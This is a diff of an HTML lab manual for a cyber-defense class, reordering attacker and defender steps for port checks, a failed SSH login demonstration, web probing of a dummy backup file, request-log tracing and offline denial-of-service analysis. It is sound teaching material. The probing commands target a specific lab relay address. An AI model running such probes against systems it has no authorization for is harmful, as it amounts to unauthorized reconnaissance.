 <p><strong>Practice check:</strong> show the sender’s destination and PID, the receiver receipt and matching dummy-data
-  checksum, the failed blocked retry and normal services. Switch roles and repeat from Step 1. No written report
+  checksum, the failed blocked retry and normal services. Switch roles and repeat from Defender step 1. No written report
   submission is required.</p>
 <section id="before-login">
   <h2 id="module-2">Module 2 — Attacker starts without system access</h2><p><strong>Command locations:</strong> the attacker works outside the target VM; the defender inspects and administers the assigned VM. Laptop HTTP uses <code>http://128.198.74.133:18080</code> and RDP uses <code>128.198.74.133:13389</code>. Use only these assigned relay endpoints on the approved campus connection. Private guest addresses are for defender checks and the explicitly assigned lab-host SSH test. Task 2.5 uses offline evidence, not a live attack.</p><span id="authentication"></span><span
     id="web-inputs"></span>
   <p>Practice service discovery, authentication and request-log investigation, and analysis of a supplied incident timeline.</p>
   <h3 id="discovery">Task 2.1 — Port scanning and service discovery</h3>
-<p>Compare the attacker’s view of reachable ports with the defender’s service inventory. Follow the steps below:</p>
-<ol>
-  <li>Defender — establish the service inventory</li>
-  <li>Attacker — one bounded pass</li>
-  <li>Defender — explain and verify</li>
-</ol>
+<p>Compare the attacker’s view of reachable ports with the defender’s service inventory. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — One bounded pass from your laptop</h5>
+<p>Test only your assigned HTTP and RDP relay ports once. These external ports map to guest TCP 80 and 3389 respectively. Do not scan other host ports or subnets.</p><h6>Attacker uses Windows — PowerShell</h6><pre>Test-NetConnection -ComputerName 128.198.74.133 -Port 18080
+Test-NetConnection -ComputerName 128.198.74.133 -Port 13389</pre><h6>Attacker uses macOS or Linux — Terminal</h6><p>The commands are the same on both systems and require <code>nc</code>. If it is unavailable, use an instructor-provided workstation with the tool installed.</p><pre>nc -vz -w 3 128.198.74.133 18080
+nc -vz -w 3 128.198.74.133 13389</pre><p>Record reachability, time and source computer. A successful TCP connection proves the relay accepted a connection, not that the guest service is healthy. Open <a href="http://128.198.74.133:18080/index.html">the assigned website</a> to check the HTTP response. A timeout can reflect campus access restrictions or filtering as well as a service issue.</p><h4>Defender</h4>
+<h5>Step 1 — Establish the service inventory</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
 
-  <h4>Step 1 — Defender: establish the service inventory</h4>
   <p>Record the guest listeners before the external checks. Compare the published relay ports with their guest destinations. Required guest ports are 22 (SSH), 80 (HTTP), and 3389 (RDP).</p>
   <p>Record the time for comparison with the evidence:</p>
 <pre>date -Is</pre>
@@ -1068,9 +1092,8 @@ curl --max-time 5 -fsS http://172.29.242.1:18081/receipts/linux</pre>
 <pre>sudo ss -lntup</pre>
 <p>Check and record the service states:</p>
 <pre>systemctl is-active nginx ssh xrdp</pre>
-  <h4>Step 2 — Attacker: one bounded pass from your laptop</h4><p>Test only your assigned HTTP and RDP relay ports once. These external ports map to guest TCP 80 and 3389 respectively. Do not scan other host ports or subnets.</p><h5>Attacker uses Windows — PowerShell</h5><pre>Test-NetConnection -ComputerName 128.198.74.133 -Port 18080
-Test-NetConnection -ComputerName 128.198.74.133 -Port 13389</pre><h5>Attacker uses macOS or Linux — Terminal</h5><p>The commands are the same on both systems and require <code>nc</code>. If it is unavailable, use an instructor-provided workstation with the tool installed.</p><pre>nc -vz -w 3 128.198.74.133 18080
-nc -vz -w 3 128.198.74.133 13389</pre><p>Record reachability, time and source computer. A successful TCP connection proves the relay accepted a connection, not that the guest service is healthy. Open <a href="http://128.198.74.133:18080/index.html">the assigned website</a> to check the HTTP response. A timeout can reflect campus access restrictions or filtering as well as a service issue.</p><h4>Step 3 — Defender: explain and verify</h4>
+  <h5>Step 2 — Explain and verify</h5>
+
   <ol>
     <li>Compare probe results with the inventory. Explain each expected listener and investigate any discrepancy.</li>
     <li>Inspect existing firewall or service logs for the recorded time window. A connection-only probe may leave no
@@ -1084,13 +1107,14 @@ nc -vz -w 3 128.198.74.133 13389</pre><p>Record reachability, time and source co
     configuration cleanup is needed. The relay does not expose every guest listener; explain the difference between the internal inventory and the externally reachable endpoints.</p>
   <h3 id="section-2-2-practical-investigate-failed-ssh-authentication">Task 2.2 Investigate failed SSH authentication</h3>
 <p><strong>Instructor-operated login demonstration:</strong> the instructor performs all login attempts for this task from outside the target VM. Students do not run the login commands or enter passwords. Students establish the defender baseline, observe the attempt times and results, then investigate the guest logs.</p>
-<p>Investigate rejected authentication attempts and distinguish the evidence from a successful login. Follow the steps below:</p>
-<ol>
-  <li>Defender — establish the baseline</li>
-  <li>Instructor — demonstrate the failed authentication attempt</li>
-  <li>Defender — inspect and explain the authentication evidence</li>
-</ol>
-<h4>Step 1 — Defender: establish the baseline</h4>
+<p>Investigate rejected authentication attempts and distinguish the evidence from a successful login. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the instructor demonstration. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Instructor</h4>
+<h5>Step 1 — Failed SSH attempt from outside the VM</h5>
+<p><strong>Access requirement:</strong> this task requires an instructor-approved attacker workstation with a direct route to <code>172.29.242.30:22</code>. Ordinary campus laptops do not have that route, and the current relay does not publish SSH. In the current lab, the instructor’s physical Linux host is the available source. The instructor operates this host for the demonstration; do not give students host credentials or run the attempt inside the target VM. The client variants below apply only after the instructor confirms direct routing.</p><h6>Instructor uses Windows — PowerShell</h6><p>Use OpenSSH Client (<code>ssh -V</code> checks availability). If missing, use an approved workstation with it installed.</p><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><h6>Instructor uses macOS — Terminal</h6><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><h6>Instructor uses Linux — Terminal</h6><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><p>Instructor: use the physical Linux lab host for the current setup. Use another client variant only if its approved direct route has been verified. Record the source computer and announce the attempt time to students. Choose only one client variant. Compare the first-connection ED25519 host-key prompt with the fingerprint recorded by the defender. Enter arbitrary dummy text once and expect rejection. Repeat manually at most twice more, for no more than three attempts against the confirmed nonexistent account. Stop on a routing or connection error; do not substitute the relay host’s own SSH service. The defender records the actual source and timestamps, not an assumed loopback source.</p><h4>Defender</h4>
+<h5>Step 1 — Establish the baseline</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+
   <p><strong>Defender, Ubuntu terminal:</strong> establish the baseline and note the current time. Confirm the test account does not exist. If <code>getent</code> prints an account, choose a different nonexistent
     test name and use it consistently in this task.</p>
   <p>Record the time for comparison with the evidence:</p>
@@ -1105,7 +1129,8 @@ nc -vz -w 3 128.198.74.133 13389</pre><p>Record reachability, time and source co
     <p>Before the first connection, the defender records the VM’s public SSH host-key fingerprint in the original
     Terminal:</p>
 <pre>ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub</pre>
-<h4>Step 2 — Instructor: failed SSH attempt from outside the VM</h4><p><strong>Access requirement:</strong> this task requires an instructor-approved attacker workstation with a direct route to <code>172.29.242.30:22</code>. Ordinary campus laptops do not have that route, and the current relay does not publish SSH. In the current lab, the instructor’s physical Linux host is the available source. The instructor operates this host for the demonstration; do not give students host credentials or run the attempt inside the target VM. The client variants below apply only after the instructor confirms direct routing.</p><h5>Instructor uses Windows — PowerShell</h5><p>Use OpenSSH Client (<code>ssh -V</code> checks availability). If missing, use an approved workstation with it installed.</p><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><h5>Instructor uses macOS — Terminal</h5><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><h5>Instructor uses Linux — Terminal</h5><pre>ssh -o HostKeyAlgorithms=ssh-ed25519 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 ccdc-probe-no-user@172.29.242.30</pre><p>Instructor: use the physical Linux lab host for the current setup. Use another client variant only if its approved direct route has been verified. Record the source computer and announce the attempt time to students. Choose only one client variant. Compare the first-connection ED25519 host-key prompt with the fingerprint recorded by the defender. Enter arbitrary dummy text once and expect rejection. Repeat manually at most twice more, for no more than three attempts against the confirmed nonexistent account. Stop on a routing or connection error; do not substitute the relay host’s own SSH service. The defender records the actual source and timestamps, not an assumed loopback source.</p><h4>Step 3 — Defender: inspect and explain the authentication evidence</h4><p>Students: wait until the instructor announces that the attempt is complete. Compare the observed rejection and recorded time with the guest evidence below. Ask the instructor before any additional attempt.</p>
+<h5>Step 2 — Inspect and explain the authentication evidence</h5>
+<p>Students: wait until the instructor announces that the attempt is complete. Compare the observed rejection and recorded time with the guest evidence below. Ask the instructor before any additional attempt.</p>
 <p>Inspect the relevant log records for the exercise time window:</p>
 <pre>sudo journalctl -u ssh --since '10 minutes ago' --no-pager</pre>
 <p>If the unit-filtered query missed records, check the SSH daemon records:</p>
@@ -1118,28 +1143,31 @@ nc -vz -w 3 128.198.74.133 13389</pre><p>Record reachability, time and source co
     on this VM.</p>
   <h3 id="section-2-3-practical-investigate-web-probing-and-a-dummy-exposed-backup">Task 2.3 Investigate web probing and a
     dummy exposed backup</h3>
-<p>Investigate requests for a missing file and a deliberately exposed dummy backup. Follow the steps below:</p>
-<ol>
-  <li>Attacker — make the assigned web requests</li>
-  <li>Defender — inspect the request evidence</li>
-  <li>Defender — mitigate, repeat and verify</li>
-</ol>
-<h4>Step 1 — Attacker: make the assigned web requests</h4>
+<p>Investigate requests for a missing file and a deliberately exposed dummy backup. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Make the assigned web requests</h5>
+
+<p><strong>Attacker — on your own laptop:</strong> make the following three requests once each, without elevation. The first is normal traffic; the other two model
+  someone looking for files without logging in.</p>
+  <p>Request the webpage and compare the response with the expected result for this step:</p>
+<h6>Attacker uses Windows — PowerShell on your laptop</h6><pre>curl.exe -i --max-time 5 http://128.198.74.133:18080/index.html
+curl.exe -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-missing.txt
+curl.exe -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><h6>Attacker uses macOS or Linux — Terminal on your laptop</h6><pre>curl -i --max-time 5 http://128.198.74.133:18080/index.html
+curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-missing.txt
+curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><p>Choose one command set and run each request once, without elevation. Expected results: 200 with the operational page, 404 for the missing file, and 200 with the dummy backup. Use this same client and URLs to retest after defender cleanup.</p><h4>Defender</h4>
+<h5>Step 1 — Prepare the dummy exposure</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+
 <p><strong>Defender — scenario preparation inside the target VM:</strong> create only the dummy exposure below before the attacker starts. The attacker does not log in to the target or prepare files.</p>
 <p>Check that the dummy-backup path and missing-file path are absent:</p>
 <pre>sudo ls -l /var/www/html/ccdc-probe-backup.txt /var/www/html/ccdc-probe-missing.txt</pre>
 <p>Expect “No such file or directory” for both paths. If the known dummy backup remains from an earlier round,
-  complete Step 3 before starting again. Do not overwrite an unknown existing file.</p>
+  complete Defender step 3 before starting again. Do not overwrite an unknown existing file.</p>
 <p>Publish only the fictional exercise marker as the exposed backup:</p>
 <pre>printf '%s\n' 'CCDC DUMMY BACKUP - NO REAL SECRETS' | sudo tee /var/www/html/ccdc-probe-backup.txt</pre>
-<p><strong>Attacker — on your own laptop:</strong> make the following three requests once each, without elevation. The first is normal traffic; the other two model
-  someone looking for files without logging in.</p>
-  <p>Request the webpage and compare the response with the expected result for this step:</p>
-<h5>Attacker uses Windows — PowerShell on your laptop</h5><pre>curl.exe -i --max-time 5 http://128.198.74.133:18080/index.html
-curl.exe -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-missing.txt
-curl.exe -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><h5>Attacker uses macOS or Linux — Terminal on your laptop</h5><pre>curl -i --max-time 5 http://128.198.74.133:18080/index.html
-curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-missing.txt
-curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><p>Choose one command set and run each request once, without elevation. Expected results: 200 with the operational page, 404 for the missing file, and 200 with the dummy backup. Use this same client and URLs to retest after defender cleanup.</p><h4>Step 2 — Defender: inspect the request evidence</h4>
+<h5>Step 2 — Inspect the request evidence</h5>
+
 <p><strong>Defender:</strong> inspect Nginx access records. Expect 200 for the normal page, 404 for the missing path
     and 200 with clearly labeled dummy text for the published backup. If results differ, inspect the setup rather than
     claiming success.</p>
@@ -1151,7 +1179,8 @@ curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><p>C
   <p>Locate the source, timestamp including timezone offset, method, request path and HTTP status. A request to a
     suspicious path shows probing; a 200 with the dummy content shows information was available without authentication.
     Neither alone proves command execution or a server takeover. These requests cross the laptop-to-relay path. Guest logs normally show the relay source; correlate timestamps and paths rather than identifying a person from that address.</p>
-  <h4 id="section-mitigate-repeat-and-verify">Step 3 — Defender: mitigate, repeat and verify</h4><p>After guest cleanup, ask the attacker to repeat the same laptop requests to <code>http://128.198.74.133:18080</code>. The removed backup should return 404 and index.html should return operational content. The guest commands below provide additional internal checks.</p>
+  <h5 id="section-mitigate-repeat-and-verify">Step 3 — Mitigate, repeat and verify</h5>
+<p>After guest cleanup, ask the attacker to repeat the same laptop requests to <code>http://128.198.74.133:18080</code>. The removed backup should return 404 and index.html should return operational content. The guest commands below provide additional internal checks.</p>
   <p>Preserve the relevant log entries before cleanup. Confirm that this exact file contains only the exercise dummy
     marker. Then remove only the exercise file; keep Nginx and SSH running.</p>
   <p>Read the exercise file and confirm it contains only the dummy marker:</p>
@@ -1178,15 +1207,24 @@ curl -i --max-time 5 http://128.198.74.133:18080/ccdc-probe-backup.txt</pre><p>C
   <p>Reference: <a href="https://nginx.org/en/docs/http/ngx_http_log_module.html">Nginx access logging</a>.</p>
 
   <h3 id="traffic">Task 2.4 — Investigate suspicious request traffic</h3>
-<p>Trace a short sequence of web requests through the access logs and explain the evidence. Follow the steps below:</p>
-<ol>
-  <li>Prepare</li>
-  <li>Attacker — generate a short request sequence</li>
-  <li>Defender — find and interpret the evidence</li>
-  <li>Verify and close the round</li>
-</ol>
+<p>Trace a short sequence of web requests through the access logs and explain the evidence. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Generate requests from your laptop</h5>
+<p>Choose one command set for your laptop. Run once: four requests separated by one second. Record the marker and start time. Do not use a terminal inside the target VM.</p><h6>Attacker uses Windows — PowerShell</h6><pre>$marker = &#x27;ccdc24-&#x27; + (Get-Date -Format yyyyMMddHHmmss)
+&quot;Round marker: $marker&quot;
+&#x27;index.html&#x27;,&#x27;ccdc24-missing.txt&#x27;,&#x27;ccdc24-backup.zip&#x27;,&#x27;index.html&#x27; | ForEach-Object {
+  curl.exe --max-time 5 -sS -o NUL -w &quot;%{http_code} %{url_effective}\n&quot; &quot;http://128.198.74.133:18080/$($_)?round=$marker&quot;
+  Start-Sleep -Seconds 1
+}</pre><h6>Attacker uses macOS or Linux — Terminal</h6><pre>marker=&quot;ccdc24-$(date +%s)&quot;
+printf &#x27;Round marker: %s\n&#x27; &quot;$marker&quot;
+for path in index.html ccdc24-missing.txt ccdc24-backup.zip index.html; do
+  curl --max-time 5 -sS -o /dev/null -w &#x27;%{http_code} %{url_effective}\n&#x27; &quot;http://128.198.74.133:18080/$path?round=$marker&quot;
+  sleep 1
+done</pre><p>Expect 200, 404, 404, 200. Give the marker to the defender after they locate the sequence. Guest logs may show the relay rather than your laptop address.</p><h4>Defender</h4>
+<h5>Step 1 — Prepare</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
 
-  <h4>Step 1 — Prepare</h4>
   <p>The defender confirms access logging is enabled and the two probe paths below do not exist, then records
     the time and normal page response. This exercise uses web access logs as network-request evidence; it is not a
     packet-capture exercise.</p>
@@ -1196,17 +1234,8 @@ sudo tail -n 5 /var/log/nginx/access.log</pre>
 <p>Confirm the two probe files do not exist; expect “No such file or directory” for both:</p>
 <pre>sudo ls -l /var/www/html/ccdc24-missing.txt /var/www/html/ccdc24-backup.zip</pre>
 
-  <h4>Step 2 — Attacker: generate requests from your laptop</h4><p>Choose one command set for your laptop. Run once: four requests separated by one second. Record the marker and start time. Do not use a terminal inside the target VM.</p><h5>Attacker uses Windows — PowerShell</h5><pre>$marker = &#x27;ccdc24-&#x27; + (Get-Date -Format yyyyMMddHHmmss)
-&quot;Round marker: $marker&quot;
-&#x27;index.html&#x27;,&#x27;ccdc24-missing.txt&#x27;,&#x27;ccdc24-backup.zip&#x27;,&#x27;index.html&#x27; | ForEach-Object {
-  curl.exe --max-time 5 -sS -o NUL -w &quot;%{http_code} %{url_effective}\n&quot; &quot;http://128.198.74.133:18080/$($_)?round=$marker&quot;
-  Start-Sleep -Seconds 1
-}</pre><h5>Attacker uses macOS or Linux — Terminal</h5><pre>marker=&quot;ccdc24-$(date +%s)&quot;
-printf &#x27;Round marker: %s\n&#x27; &quot;$marker&quot;
-for path in index.html ccdc24-missing.txt ccdc24-backup.zip index.html; do
-  curl --max-time 5 -sS -o /dev/null -w &#x27;%{http_code} %{url_effective}\n&#x27; &quot;http://128.198.74.133:18080/$path?round=$marker&quot;
-  sleep 1
-done</pre><p>Expect 200, 404, 404, 200. Give the marker to the defender after they locate the sequence. Guest logs may show the relay rather than your laptop address.</p><h4>Step 3 — Defender: find and interpret the evidence</h4>
+  <h5>Step 2 — Find and interpret the evidence</h5>
+
   <pre>sudo tail -n 120 /var/log/nginx/access.log | grep 'ccdc24-'</pre>
   <p>Use the actual configured Nginx log path if it differs. Combined access logs include the request path and query.
     Preserve each timestamp’s timezone offset when comparing evidence.
@@ -1220,31 +1249,32 @@ done</pre><p>Expect 200, 404, 404, 200. Give the marker to the defender after th
     <li>Propose one response if a sensitive backup really were exposed: preserve evidence and remove the exposed copy
       while leaving normal content available.</li>
   </ol>
-  <h4>Step 4 — Verify and close the round</h4>
+  <h5>Step 3 — Verify and close the round</h5>
+
   <p>Repeat one normal index request and confirm operational content. Retain the relevant log lines; do not clear the
     logs. No files, accounts or rules were changed. Reverse roles with a new marker. <strong>Complete:</strong> show the
     ordered requests, explain their significance and uncertainty, and demonstrate normal service.</p>
   <h3 id="dos">Task 2.5 — Investigate denial of service and resource exhaustion</h3>
-<p>Analyze a simulated service-degradation incident using the supplied CSV timeline. Follow the steps below:</p>
-<ol>
-  <li>Open the evidence inside your assigned VM</li>
-  <li>Attacker — present the scenario</li>
-  <li>Defender — analyze</li>
-  <li>Recovery criteria and live service check</li>
-</ol>
-  <p>This is a concrete offline investigation using a supplied synthetic incident dataset. It does not generate a flood
+<p>Analyze a simulated service-degradation incident using the supplied CSV timeline. Use the role-specific steps below.</p>
+<p>This is a concrete offline investigation using a supplied synthetic incident dataset. It does not generate a flood
     or change the live service. The attacker presents the incident evidence from their own computer; the defender diagnoses it, proposes
     containment, and validates the recovery evidence.</p>
-  <h4>Step 1 — Open the evidence inside your assigned VM</h4>
+  <p><strong>Round order:</strong> Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Present the scenario</h5>
+<p><strong>Windows, macOS or Linux attacker computer:</strong> download <a href="dos-linux-timeline.csv" download>the incident CSV</a> to your own computer and open it in a text editor or spreadsheet viewer and present the scenario below. No attack command is run for this offline exercise. The defender’s analysis commands remain specific to the target VM.</p>
+  <p>Tell the defender: “Users report slow pages and intermittent errors starting at 10:02 UTC. The service monitor
+    still reports the web service running.” Provide the CSV. Do not stop the real service or send load traffic.</p>
+  <h4>Defender</h4>
+<h5>Step 1 — Open the evidence inside your assigned VM</h5>
+
   <p>Save <a href="dos-linux-timeline.csv" download>the Linux incident CSV</a> into Downloads inside the VM. If viewing
     this pack on a laptop, copy the CSV into the VM first. The commands below use that Downloads path; adjust it if
     needed. Each row is a one-minute measurement. requests and http_5xx are counts; p95_ms is the 95th-percentile
     response time in milliseconds; cpu_pct and memory_pct are percentages. The documentation-range source IP is
     fictional and must not be contacted.</p>
-  <h4>Step 2 — Attacker: present the scenario</h4><p><strong>Windows, macOS or Linux attacker computer:</strong> open the supplied CSV in a text editor or spreadsheet viewer and present the scenario below. No attack command is run for this offline exercise. The defender’s analysis commands remain specific to the target VM.</p>
-  <p>Tell the defender: “Users report slow pages and intermittent errors starting at 10:02 UTC. The service monitor
-    still reports the web service running.” Provide the CSV. Do not stop the real service or send load traffic.</p>
-  <h4>Step 3 — Defender: analyze</h4>
+  <h5>Step 2 — Analyze</h5>
+
   <p>Display the incident timeline as a table:</p>
 <pre>column -s, -t "$HOME/Downloads/dos-linux-timeline.csv"</pre>
 <p>Read the seven measurement rows and match each value to its column heading. Use a calculator to compute these
@@ -1269,7 +1299,8 @@ done</pre><p>Expect 200, 404, 404, 200. Give the marker to the defender after th
     <li>Treat the 10:05 and 10:06 rows as supplied post-containment evidence. Verify recovery against the criteria below
       and explain what monitoring you would continue.</li>
   </ol>
-  <h4>Step 4 — Recovery criteria and live service check</h4>
+  <h5>Step 3 — Recovery criteria and live service check</h5>
+
   <p>Accept the scenario recovery only if both final samples have a running service, p95 latency below 200 ms, error
     rate below 1%, and CPU below 50%. Then independently check the real VM with the read-only commands below. The live
     check demonstrates lab availability, not that you mitigated the synthetic incident.</p>
